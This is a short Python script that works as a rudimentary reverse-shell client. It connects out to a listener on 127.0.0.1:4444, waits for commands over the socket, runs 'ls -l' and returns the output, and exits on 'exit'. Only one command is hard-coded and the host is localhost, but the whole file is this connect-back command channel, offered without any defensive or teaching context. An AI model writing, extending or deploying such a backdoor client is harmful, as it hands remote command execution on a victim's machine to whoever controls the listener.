import socket as sk
import subprocess


HOST = '127.0.0.1'
PORT = 4444

s = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(b"Input:")

while 1:
    data = s.recv(1024)
    data = data.decode('utf-8').replace("\n","")
    if (data == 'ls -l'):
        tosand = subprocess.run(['ls', '-l'], capture_output= True)
        s.sendall(tosand.stdout)
    elif (data == 'exit'):
        break